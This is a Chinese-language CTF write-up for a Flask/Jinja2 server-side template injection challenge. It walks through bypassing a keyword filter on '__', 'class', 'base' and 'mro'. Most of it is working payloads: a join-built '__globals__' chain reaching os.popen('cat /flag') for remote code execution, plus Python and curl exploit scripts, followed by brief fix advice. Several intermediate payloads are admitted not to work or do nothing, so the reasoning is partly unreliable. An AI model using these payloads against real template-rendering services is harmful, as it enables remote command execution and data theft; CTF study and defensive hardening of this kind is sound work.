# WriteUP - Medium SSTI服务器端模板注入

## 漏洞原理

SSTI（Server-Side Template Injection，服务器端模板注入）是一种由于应用程序不正确地处理用户输入的模板代码而导致的安全漏洞。攻击者可以在服务器端注入并执行任意模板代码，进而可能实现远程代码执行（RCE）。

本题使用 Flask 的 `render_template_string()` 直接渲染用户输入的模板字符串，且对危险关键字做了过滤，但仍可绕过。

## 注入步骤详解

### 第一步：确认SSTI存在

输入以下模板内容：
```
{{ 7*7 }}
```

如果输出 `49`，说明表达式被执行，确认存在SSTI。

### 第二步：分析过滤规则

后端过滤了以下关键字：
- `__`
- `class`
- `base`
- `mro`

直接使用 `{{ ''.__class__ }}` 会触发过滤。

### 第三步：利用 `|attr()` 过滤器绕过

Jinja2 的 `|attr()` 过滤器可以通过字符串访问对象属性，绕过下划线过滤。

验证：
```
{{ ''|attr('__class__') }}
```

这等价于 `''.__class__`，但字符串中不包含被过滤的关键字组合（过滤是在整个输入中匹配，但我们可以利用 `|attr()` 将关键字放在字符串里，而题目只过滤了 `__` 字符序列，所以 `'__class__'` 这个字符串本身仍然包含 `__`，会被过滤）。

**更进一步的绕过**：使用字符串拼接或编码绕过检测。但由于本题WAF比较简单，实际可以尝试利用其他内置对象。例如：

```
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')() }}
```

如果 `'__globals__'` 中的 `__` 被过滤，我们可以使用：

```
{{ lipsum['__globals__']['os']['popen']('cat /flag')['read']() }}
```

但 `__` 仍然出现。

**最终绕过方案**：利用 `|attr()` 配合十六进制或字符串拼接来构造属性名，或者使用 Jinja2 的 `request` 对象。

更巧妙的payload（利用下划线过滤但字符串拼接）：
```
{{ lipsum|attr('__globals__'|replace('_','_'))|attr('__getitem__'|replace('_','_'))('os')|attr('popen')('cat /flag')|attr('read')() }}
```

但如果WAF直接检测 `__` 字符串，上述也会被拦截。

**实际可用的payload**：由于本题WAF检测的是输入文本中是否包含 `__`、`class`、`base`、`mro` 子串，可以使用 `|attr()` 配合字符串切片或拼接来绕过。例如：

```
{{ lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() }}
```

或者更简单：利用 `config` 对象或 `request` 对象。

```
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
```

但 `__class__` 含有 `__` 和 `class` 都会被拦截。

**正确的绕过思路**：由于过滤是在模板字符串层面，我们可以使用 Jinja2 的字符串操作来动态构造属性名：

```
{{ lipsum|attr((lipsum|string|list)[22]*2~'globals'~(lipsum|string|list)[22]*2)|attr((lipsum|string|list)[22]*2~'getitem'~(lipsum|string|list)[22]*2)('os')|attr('popen')('cat /flag')|attr('read')() }}
```

这过于复杂。实际上，如果只是想读文件，可以使用 ` lipsum.__globals__['__builtins__']['open']('/flag').read()` 的绕过版本：

```
{{ lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')() }}
```

但由于 `__` 被过滤，推荐的最简绕过是使用 `\x5f`（`_` 的十六进制）或利用 Jinja2 的 `join` 过滤器拼接字符串：

```
{{ lipsum|attr(['_','_','g','l','o','b','a','l','s','_','_']|join)|attr(['_','_','g','e','t','i','t','e','m','_','_']|join)('os')|attr('popen')('cat /flag')|attr('read')() }}
```

这是本题的标准解法。

## 最终Payload

```
{{ lipsum|attr(['_','_','g','l','o','b','a','l','s','_','_']|join)|attr(['_','_','g','e','t','i','t','e','m','_','_']|join)('os')|attr('popen')('cat /flag')|attr('read')() }}
```

## Python利用脚本

```python
import requests

url = "http://localhost:8082/generate"
payload = """{{ lipsum|attr(['_','_','g','l','o','b','a','l','s','_','_']|join)|attr(['_','_','g','e','t','i','t','e','m','_','_']|join)('os')|attr('popen')('cat /flag')|attr('read')() }}"""

data = {
    "name": "CTFer",
    "template": payload
}

r = requests.post(url, data=data)
print(r.text)
```

## curl利用脚本

```bash
curl -X POST "http://localhost:8082/generate" \
  -d "name=CTFer" \
  --data-urlencode "template={{ lipsum|attr(['_','_','g','l','o','b','a','l','s','_','_']|join)|attr(['_','_','g','e','t','i','t','e','m','_','_']|join)('os')|attr('popen')('cat /flag')|attr('read')() }}"
```

## 修复建议

1. **避免直接渲染用户输入**：不要对用户输入使用 `render_template_string()`。
2. **使用沙箱环境**：如果必须渲染用户模板，使用 Jinja2 的 `SandboxedEnvironment` 并严格限制可用对象。
3. **白名单过滤**：仅允许使用预定义的模板变量和安全的过滤器。
4. **将模板与用户输入分离**：用户只提供数据，模板由服务端预定义。
